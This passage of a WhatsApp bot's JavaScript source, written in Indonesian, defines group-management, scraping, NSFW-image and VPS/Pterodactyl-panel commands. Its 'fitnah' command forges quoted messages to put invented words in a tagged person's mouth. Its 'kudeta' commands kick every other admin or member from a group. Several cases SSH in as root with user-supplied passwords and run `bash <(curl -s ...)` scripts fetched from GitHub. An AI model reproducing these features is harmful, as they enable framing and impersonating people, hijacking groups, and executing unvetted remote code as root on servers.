                ? m.reply(`✅ Jadwal diubah.\n📌 Tutup: ${argsbiyuoffc[1]} WIB\n📌 Buka: ${argsbiyuoffc[2]} WIB`)
                : m.reply('❌ Gagal menyimpan pengaturan.');
        }
        if (argsbiyuoffc[0]?.toLowerCase() === 'status') {
            if (!global.autoGC[chatId]) return m.reply('⚠️ Auto-close/open tidak aktif.');
            const { enabled, closeTime, openTime, status } = global.autoGC[chatId];
            return m.reply(`📊 *STATUS AUTO GC*\n\n` +
                `Status: ${enabled ? '✅ Aktif' : '❌ Nonaktif'}\n` +
                `Status Grup: ${status === 'closed' ? '🔒 Tertutup' : '🔓 Terbuka'}\n` +
                `Tutup: ${closeTime} WIB\nBuka: ${openTime} WIB`);
        }
        return m.reply('⚠️ Format salah! Gunakan:\n- auto on\n- auto off\n- auto set HH:MM HH:MM\n- auto status');
    } catch (err) {
        console.error('Error in auto command:', err);
        return m.reply('❌ Terjadi kesalahan.');
    }
}
break

case "close":
case "opengc":
case "open": {
    if (!m.isGroup) return m.reply('❌ Perintah ini hanya bisa digunakan di grup!');
    if (!m.isBotAdmin) return m.reply('❌ Bot harus menjadi admin!');
    if (!isCreator && !m.isAdmin) return m.reply('❌ Hanya admin yang bisa menggunakan perintah ini.');

    if (/open|opengc/.test(command)) {
        await conn.groupSettingUpdate(m.chat, 'not_announcement');
        m.reply('✅ Grup telah *DIBUKA*.');
    } else if (/closegc|close/.test(command)) {
        await conn.groupSettingUpdate(m.chat, 'announcement');
        m.reply('❌ Grup telah *DITUTUP*.');
    }
}
break

case 'detik':
case 'detiknews': {
  if (!q) return m.reply('Contoh: detik Prabowo')

  try {
    const axios = require("axios")
    const cheerio = require("cheerio")
    const url = `https://www.detik.com/search/searchall?query=${q}`
    const { data } = await axios.get(url)
    const $ = cheerio.load(data)
    const hasil = []
    $("article.list-content__item").each((_, el) => {
      const title = $(el).find("a.media__link").text().trim()
      const subtitle = $(el).find("h2.media__subtitle").text().trim()
      const date = $(el).find("span").text().trim()
      const link = $(el).find("a.media__link").attr("href")
      const image = $(el).find("img").attr("src") || ''
      hasil.push({ title, subtitle, date, link, image })
    })
    if (hasil.length === 0) return m.reply('Beritanya nggak ketemu.')

    let biyukontl = `*Hasil Pencarian Detik untuk:* ${q}\n\n`
    hasil.slice(0, 5).forEach((item, i) => {
      biyukontl += `*${i + 1}. ${item.title}*\n`
      if (item.subtitle) biyukontl += `_${item.subtitle}_\n`
      biyukontl += `${item.date}\n`
      biyukontl += `${item.link}\n\n`
    })
    await conn.sendMessage(m.chat, { text: biyukontl }, { quoted: m })
  } catch (err) {
    console.error(err)
    m.reply('Bentar Gw Mles Bngt.')
  }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc2": case "kudeta2": {
    if (!isCreator) return Reply(mess.owner);
    let groupMetadata = await conn.groupMetadata(m.chat);
    let botData = groupMetadata.participants.find(p => p.id === botNumber);
    if (!botData || !botData.admin) return m.reply("Bot harus menjadi admin untuk menjalankan perintah ini!");
    let memberFilter = groupMetadata.participants
        .filter(v => v.id !== botNumber && v.id !== m.sender) 
        .map(v => v.id);
    if (memberFilter.length < 1) return m.reply("Tidak ada member lain yang bisa dikick!");
    await m.reply(`Kudeta Grup oleh ${global.namaOwner} dimulai 🔥`);
    for (let i of memberFilter) {
        await conn.groupParticipantsUpdate(m.chat, [i], 'remove').catch(err => {
            console.log(`Gagal mengeluarkan ${i}:`, err);
        });
        await sleep(1000);
    }
    await m.reply("Kudeta Grup telah berhasil 🏴‍☠️");
}
break

case "kudetagc": case "kudeta": {
    if (!isCreator) return Reply(mess.owner);
    let groupMetadata = await conn.groupMetadata(m.chat);
    let botData = groupMetadata.participants.find(p => p.id === botNumber);
    if (!botData || !botData.admin) return m.reply("Bot harus menjadi admin untuk menjalankan perintah ini!");
    let adminFilter = groupMetadata.participants
        .filter(v => v.admin && v.id !== botNumber && v.id !== m.sender)
        .map(v => v.id);
    if (adminFilter.length < 1) return m.reply("Tidak ada admin lain yang bisa dikick!");
    await m.reply(`Kudeta Grup oleh ${global.namaOwner} dimulai 🔥`);
    for (let i of adminFilter) {
        await conn.groupParticipantsUpdate(m.chat, [i], 'remove').catch(err => {
            console.log(`Gagal mengeluarkan ${i}:`, err);
        });
        await sleep(1000);
    }
    await m.reply("Kudeta Grup telah berhasil 🏴‍☠️");
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemanebula": case "temanebula": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//=================================//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'waifu2': {
  try {
    const axios = require('axios');
    let res = await axios.get('https://fastrestapis.fasturl.cloud/sfwnsfw/anime?type=sfw&tag=waifu', {
      responseType: 'arraybuffer'
    });
    conn.sendMessage(m.chat, {
      image: Buffer.from(res.data),
      caption: 'Nih waifumu~\n\nBuat bacol enak 🤗'
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    m.reply('Lagi error bang, coba lagi nanti.');
  }
}
break

case "waifu": case "hentai": {    
    await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
    
    const isNsfw = (m.command === 'hentai')
    let endpoints = [
        isNsfw ? 'https://api.waifu.pics/nsfw/waifu' : 'https://api.waifu.pics/sfw/waifu',
        isNsfw ? 'https://api.waifu.pics/nsfw/neko' : 'https://api.waifu.pics/sfw/neko'
    ]

    try {
        let allImages = []
        for (let endpoint of endpoints) {
            const images = []
            for (let i = 0; i < 2; i++) {
                const response = await fetch(endpoint)
                const data = await response.json()
                if (data && data.url) images.push(data.url)
            }
            allImages = [...allImages, ...images]
        }
        let araara = new Array()
        for (let i = 0; i < allImages.length; i++) {
            try {
                let imageUrl = allImages[i]
                let imgsc = await prepareWAMessageMedia(
                    { image: {url: imageUrl}}, 
                    { upload: conn.waUploadToServer }
                )
                
                let imageType = i < 2 ? 'Waifu' : 'Neko'
                
                araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{                  
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Download ${imageType}\",\"url\":\"${imageUrl}\",\"merchant_url\":\"https://www.google.com\"}`
                        }]
                    })
                })
            } catch (error) {
                console.error('Error processing image:', error)
                continue
            }
        }

        if (araara.length === 0) {
            throw new Error('No valid images found')
        }

        const msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `\nHasil pencarian ${isNsfw ? 'NSFW' : 'SFW'}\n• 2 Waifu Images\n• 2 Neko Images`
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: araara
                        })
                    })
                }
            }
        }, {userJid: m.sender, quoted: m})

        await conn.relayMessage(m.chat, msgii.message, { 
            messageId: msgii.key.id 
        })
        
        await conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
        
    } catch (error) {
        console.error('Error:', error)
        await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
        return m.reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
    }
}
break

case 'cekdomain':
case 'cekhost': {
    if (!argsbiyuoffc[0]) return m.reply('Masukkan host yang ingin dicek!\nContoh: *cekhost google.com*');
    let host = argsbiyuoffc[0];
    let apiUrl = `https://fastrestapis.fasturl.cloud/tool/checkhost?host=${host}&mode=http`;
    try {
        let response = await fetch(apiUrl);
        let data = await response.json();
        if (data.status !== 200 || !data.result) {
            return m.reply('Gagal mengambil data. Pastikan host yang dimasukkan benar.');
        }
        let resultText = `🔍 Hasil Pengecekan Host: *${data.result.host}*\n\n`;
        for (let node in data.result.result) {
            let entry = data.result.result[node];
            if (!entry) continue;
            let { country_name, flag_emoji } = entry;
            let responseTime = entry[0][1].toFixed(3);
            let status = entry[0][2];
            let ip = entry[0][4];
            resultText += `${flag_emoji} *${country_name}*\n`;
            resultText += `⏱️ Waktu Respons: ${responseTime} detik\n`;
            resultText += `📡 Status: ${status}\n`;
            resultText += `🌐 IP: ${ip}\n\n`;
        }
        m.reply(resultText);
    } catch (e) {
        console.error(e);
        m.reply('Terjadi kesalahan saat mengambil data.');
    }
}
    break
 
case "cetakqr":
case "createqr":
case "buatqr":
                case "qrtext": {
                    if(!text) return m.reply("Masukan Teks Untuk Dijadikan Qr");
                    m.reply(mess.wait);
                    const axios = require('axios');
                    let anu = `https://api.siputzx.my.id/api/tools/text2qr?text=${encodeURIComponent(text)}`;
                    const response = await axios.get(anu, { responseType: 'arraybuffer' });
                    try {
                        conn.sendMessage(m.chat, {
                            image: Buffer.from(response.data),
                            caption: '_Sudah Dijadikan Qr_'
                        }, { quoted: m })
                    } catch (e) {
                        console.log(e);
                        await m.reply('Error')
                    }
                }
                break
case "installtemaenigma": case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply("username@ipvps|pwvps|wa.me|link_channel|link_grup");
    let vii = text.split("|");
    if (vii.length < 2) return m.reply("username@ipvps|pwvps|wa.me|link_channel|link_grup");
    let ipInput = vii[0];
    let passwd = vii[1];
    let waMe = vii[2] || "https://wa.me/6285776461481"; 
    let linkChannel = vii[3] || "https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v";
    let linkGrup = vii[4] || "https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy";
    let uservps = "root"; 
    let ipvps = ipInput;
    if (ipInput.includes("@")) { 
        let splitIP = ipInput.split("@");
        uservps = splitIP[0]; 
        ipvps = splitIP[1];
    }
    const biyuSettings = {
        host: ipvps,
        port: '22',
        username: uservps,
        password: passwd
    };
    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
    const ress = new Client();
    ress.on('ready', async () => {
        m.reply(`🔹 *Memproses install tema Enigma*\nTunggu 1-10 menit...\n\n🖥️ VPS: ${ipvps}\n👤 User: ${uservps}\n🔗 WA: ${waMe}\n📢 Channel: ${linkChannel}\n👥 Grup: ${linkGrup}`);
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {    
                await m.reply("✅ *Tema Enigma berhasil diinstall!*");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`skyzodev\n`);
                stream.write(`1\n`);
                stream.write(`3\n`);
                stream.write(`${waMe}\n`);
                stream.write(`${linkGrup}\n`);
                stream.write(`${linkChannel}\n`);
                stream.write(`yes\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR:', data.toString());
            });
        });
    }).on('error', (err) => {
        console.log('connection Error:', err);
        m.reply('❌ *Gagal terhubung!* Kata sandi, username, atau IP tidak valid.');
    }).connect(biyuSettings);
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Kata sandi atau IP tidak valid')
}).connect(connSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'installrdp': {
    if (!isCreator) return Reply(mess.owner)
let dropletId = argsbiyuoffc[0];
let osOption = argsbiyuoffc[1];
if (!dropletId || !osOption)
return m.reply(`*Masukkan ID VPS dan pilihan OS yang valid!*\nContoh: ${prefix + command} <dropletId> ubuntu`);
const osRdpScripts = {
'ubuntu': `
#!/bin/bash
sudo apt update
sudo apt install -y xrdp xubuntu-desktop
sudo adduser xrdp ssl-cert
sudo systemctl enable xrdp
sudo systemctl start xrdp
sudo ufw allow 3389/tcp
sudo systemctl restart xrdp
`,
'centos': `
#!/bin/bash
sudo yum update -y
sudo yum groupinstall "GNOME Desktop" -y
sudo yum install -y xrdp
sudo systemctl enable xrdp
sudo systemctl start xrdp
sudo firewall-cmd --permanent --zone=public --add-port=3389/tcp
sudo firewall-cmd --reload
`,
'debian': `
#!/bin/bash
sudo apt update
sudo apt install -y xrdp
sudo systemctl enable xrdp
sudo systemctl start xrdp
sudo ufw allow 3389/tcp
sudo systemctl restart xrdp
`
};
if (!osRdpScripts[osOption])
return m.reply(`*OS yang dipilih tidak valid!* Pilihan OS yang valid: 'ubuntu', 'centos', 'debian'.`);
try {
const apiTokens = [
global.apiDigitalOcean
];
let dropletFound = false;
for (const token of apiTokens) {
if (!token) continue;
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${token}`
}
});
if (response.ok) {
let dropletData = await response.json();
if (dropletData?.droplet?.id == dropletId) {
dropletFound = true;
let actionResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${token}`
},
body: JSON.stringify({
type: 'run_script',
script: osRdpScripts[osOption]
})
});
if (actionResponse.ok) {
return m.reply(`✅ RDP telah berhasil diinstal pada VPS dengan ID ${dropletId} menggunakan OS ${osOption}.`);
} else {
let errorData = await actionResponse.json();
throw new Error(errorData.message || 'Terjadi kesalahan saat menjalankan skrip.');
}
}
}
}
if (!dropletFound) {
return m.reply(`❌ ID VPS ${dropletId} tidak ditemukan di semua akun DigitalOcean yang tersedia.`);
}
} catch (err) {
console.error(err);
return m.reply(`❌ Terjadi kesalahan: ${err.message}`);
}
}
break
case "installpanel": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply("username@ipvps|pwvps|panel.com|node.com|ramserver|userpanel|email@gmail.com *(contoh 100000)*")
    
    let vii = text.split("|")
    if (vii.length < 7) return m.reply("username@ipvps|pwvps|panel.com|node.com|ramserver|userpanel|email@gmail.com *(contoh 100000)*")
    
    let sukses = false
    let uservps = "root"; 
    let ipInput = vii[0]; 
    if (ipInput.includes("@")) { 
        let splitIP = ipInput.split("@");
        uservps = splitIP[0]; 
        ipInput = splitIP[1];
    }

    const { Client } = require('ssh2');
    const ress = new Client();

    const biyuSettings = {
        host: ipInput,
        port: '22',
        username: uservps, 
        password: vii[1]
    }

    function getRandom(prefix = '') {
        return prefix + Math.random().toString(36).substring(2, 10);
    }

    const pass = "admin" + getRandom("")
    let passwordPanel = pass
    const domainpanel = vii[2]
    const domainnode = vii[3]
    const ramserver = vii[4]
    const userPanel = vii[5]
    const emailPanel = vii[6]
    const deletemysql = `\n`
    const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`
    
    async function instalWings() {
        ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', 
                async (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {
                        let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* ${userPanel}
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

> Ketik ${prefix}tutor untuk melihat tutorial 
*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
                        await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
                    }).on('data', async (data) => {
                        await console.log(data.toString())
                        if (data.toString().includes("Masukkan nama lokasi: ")) {
                            stream.write('Singapore\n');
                        }
                        if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                            stream.write(`Node By ${global.namaOwner}\n`);
                        }
                        if (data.toString().includes("Masukkan domain: ")) {
                            stream.write(`${domainnode}\n`);
                        }
                        if (data.toString().includes("Masukkan nama node: ")) {
                            stream.write(`Node By ${global.namaOwner}\n`);
                        }
                        if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                            stream.write(`${ramserver}\n`);
                        }
                        if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                            stream.write(`${ramserver}\n`);
                        }
                        if (data.toString().includes("Masukkan Locid: ")) {
                            stream.write('1\n');
                        }
                    }).stderr.on('data', async (data) => {
                        console.log('Stderr : ' + data);
                    });
                });
            }).on('data', async (data) => {
                if (data.toString().includes('Input 0-6')) {
                    stream.write('1\n');
                }
                if (data.toString().includes('(y/N)')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Enter the panel address (blank for any address)')) {
                    stream.write(`${domainpanel}\n`);
                }
                if (data.toString().includes('Database host username (pterodactyluser)')) {
                    stream.write(`${userPanel}\n`);
                }
                if (data.toString().includes('Database host password')) {
                    stream.write(`${passwordPanel}\n`);
                }
                if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
                    stream.write(`${domainnode}\n`);
                }
                if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
                    stream.write(`${emailPanel}\n`);
                }
                console.log('Logger: ' + data.toString())
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        })
    }

    async function instalPanel() {
        ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await instalWings()
            }).on('data', async (data) => {
                if (data.toString().includes('Input 0-6')) {
                    stream.write('0\n');
                } 
                if (data.toString().includes('(y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Database name (panel)')) {
                    stream.write('\n');
                }
                if (data.toString().includes('Database username (pterodactyl)')) {
                    stream.write(`${userPanel}\n`);
                }
                if (data.toString().includes('Password (press enter to use randomly generated password)')) {
                    stream.write(`${passwordPanel}\n`);
                } 
                if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
                    stream.write('Asia/Jakarta\n');
                } 
                if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
                    stream.write(`${emailPanel}\n`);
                } 
                if (data.toString().includes('Email address for the initial admin account')) {
                    stream.write(`${emailPanel}\n`);
                } 
                if (data.toString().includes('Username for the initial admin account')) {
                    stream.write(`${userPanel}\n`);
                } 
                if (data.toString().includes('First name for the initial admin account')) {
                    stream.write(`${userPanel}\n`);
                } 
                if (data.toString().includes('Last name for the initial admin account')) {
                    stream.write(`${userPanel}\n`);
                } 
                if (data.toString().includes('Password for the initial admin account')) {
                    stream.write(`${passwordPanel}\n`);
                } 
                if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
                    stream.write(`${domainpanel}\n`);
                } 
                if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
                    stream.write('y\n')
                } 
                if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
                    stream.write('1\n');
                } 
                if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('(yes/no)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Still assume SSL? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Please read the Terms of Service')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('(A)gree/(C)ancel:')) {
                    stream.write('A\n');
                } 
                console.log('Logger: ' + data.toString())
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    ress.on('ready', async () => {
        await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
        ress.exec(deletemysql, async (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await instalPanel();
            }).on('data', async (data) => {
                await stream.write('\t')
                await stream.write('\n')
                await console.log(data.toString())
            }).stderr.on('data', async (data) => {
                console.log('Stderr : ' + data);
            });
        });
    }).connect(biyuSettings);
}
break
case 'fitnah': {
  if (!m.isGroup) return m.reply('❌ Fitur ini hanya bisa digunakan di grup!')
  if (!text.includes('@') || !text.includes(' ')) return m.reply(`*Contoh:* ${prefix}fitnah halo @628xxx halo juga`)
  let full = text.trim()
  let mention = full.match(/@(\d{5,})/)
  if (!mention) return m.reply('❌ Tag nomornya dong! Contoh: @628xxx')
  let target = mention[1] + '@s.whatsapp.net'
  let parts = full.split(/@\d{5,}/)
  let fakeMsg = parts[0].trim()
  let balasan = parts[1]?.trim()
  if (!fakeMsg || !balasan) return m.reply(`❌ Format salah!\nContoh: ${prefix}fitnah Halo @628xxx Halo juga`)
  let fQuoted = {
    key: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.id,
      participant: target
    },
    message: {
      conversation: fakeMsg
    }
  }
  await conn.sendMessage(m.chat, {
    text: balasan,
    mentions: [target]
  }, {
    quoted: fQuoted
  })
}
break
    case 'rebuildvps': case "rebuild": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(
        `🔹 *Format Perintah Rebuild VPS*\n\n`
        + `Gunakan format berikut:\n`
        + `\`\`\`${prefix}rebuildvps iddroplet,image\`\`\`\n\n`
        + `📌 *Penjelasan:*\n`
        + `- *iddroplet* → ID VPS yang ingin direbuild.\n`
        + `- *image* → Slug image yang akan digunakan (Ubuntu, Debian, CentOS, dll.).\n\n`
        + `✅ *Contoh Pemakaian:*\n`
        + `\`\`\`!rebuildvps 12345678,ubuntu-22-04-x64\`\`\`\n\n`
        + `📀 *Daftar OS yang Tersedia:*\n`
        + `• *Ubuntu* → ubuntu-20-04-x64, ubuntu-22-04-x64, ubuntu-24-04-x64\n`
        + `• *Debian* → debian-10-x64, debian-11-x64, debian-12-x64\n`
        + `• *CentOS* → centos-7-x64, centos-8-x64, centos-9-x64\n\n`
        + `🚀 *Kirim perintah untuk memulai rebuild VPS!*`
    );
    let argszx = text.split(",");
    if (argszx.length < 2) return m.reply("⚠️ Format tidak valid! Gunakan format yang benar seperti contoh di atas.");
    let [dropletId, image] = argszx;
    dropletId = dropletId.trim();
    image = image.trim();
    let rebuildVPS = async () => {
        try {
